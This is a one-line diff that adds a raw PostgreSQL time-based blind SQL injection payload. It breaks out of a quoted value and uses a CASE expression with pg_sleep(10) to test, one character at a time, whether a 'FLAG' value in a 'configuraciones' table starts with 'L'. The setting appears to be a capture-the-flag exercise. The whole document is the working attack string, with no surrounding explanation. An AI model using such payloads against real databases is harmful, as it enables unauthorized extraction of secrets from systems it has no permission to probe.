@@ -1,0 +1,1 @@
+RSA' WHERE nombre = 'platodeldia'; SELECT CASE when (SELECT 1 FROM configuraciones WHERE nombre ='FLAG' and valor like 'L%') = 1 then pg_sleep(10) else pg_sleep(0) end; --
